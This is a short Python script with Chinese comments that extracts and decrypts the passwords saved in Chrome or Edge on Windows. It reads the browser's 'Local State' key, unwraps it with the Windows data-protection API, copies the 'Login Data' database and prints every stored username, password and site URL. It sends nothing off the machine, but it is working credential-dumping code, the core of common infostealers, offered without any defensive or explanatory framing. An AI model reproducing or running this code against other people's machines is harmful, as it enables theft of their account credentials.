# -*- coding: utf-8 -*-
"""
Created on Wed Nov  2 15:20:43 2022

@author: admin
"""


# 直接安装pycryptodome模块即可
# pip install pycryptodome
# 如果你已经通过pip install crypto命令安装了，那么需要做以下两步：
# 切换到python安装目录的liib\site-packages目录下，将crypto目录名称修改为Crypto,即将首字母小写改成大写。


import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta



class Bpassword(object):
    def __init__(self):
        pass

    def get_chrome_datetime(self, chromedate):
        """从chrome格式的datetime返回一个`datetime.datetime`对象
    因为'chromedate'的格式是1601年1月以来的微秒数"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key(self, browser):
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", browser[0], browser[1],
                                        "User Data", "Local State")
        # local_state_path = os.path.join(os.environ["USERPROFILE"],
        #                                 "AppData", "Local", "Microsoft", "Edge",
        #                                 "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""

    def get_password(self,browser_name="Chrome"):
        #browser_name = "Edge"
        
        
        # print('*'*50)
        # print(browser_name)
        browser = ["Google", "Chrome"]
        if browser_name == "Chrome":
            browser = ["Google", "Chrome"]
        elif browser_name == "Edge":
            browser = ["Microsoft", "Edge"]

        key = self.get_encryption_key(browser)
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               browser[0], browser[1], "User Data", "default", "Login Data")

        # db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
        #                        "Microsoft", "Edge", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows
        # bpasswds = ['用户名','密码','网址','创建时间','更新时间']
        bpasswds = []
        for row in cursor.fetchall():
            passwd = []
            origin_url = row[0]
            # action_url = row[1]
            username = row[2]
            password = self.decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                # print(f"Origin URL: {origin_url}")
                # print(f"Action URL: {action_url}")
                # print(f"Username: {username}")
                # print(f"Password: {password}")

                passwd.append(username)
                passwd.append(password)
                passwd.append(origin_url)
                # passwd.append(action_url)

            else:
                continue
            if date_created != 86400000000 and date_created:
                # print(
                #     f"Creation date: {str(self.get_chrome_datetime(date_created))}")
                passwd.append(str(self.get_chrome_datetime(date_created).strftime("%Y-%m-%d %H:%M:%S")))
            else:
                passwd.append("")
            if date_last_used != 86400000000 and date_last_used:
                # print(
                #     f"Last Used: {str(self.get_chrome_datetime(date_last_used))}")
                passwd.append(str(self.get_chrome_datetime(date_last_used).strftime("%Y-%m-%d %H:%M:%S")))
            else:
                passwd.append("")
            bpasswds.append(passwd)
            # print("=" * 50)

        cursor.close()
        db.close()
        bpasswds.sort(key=lambda x:x[3], reverse=True)
        
        
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass
        
        return(bpasswds)


bp = Bpassword()
print(bp.get_password())
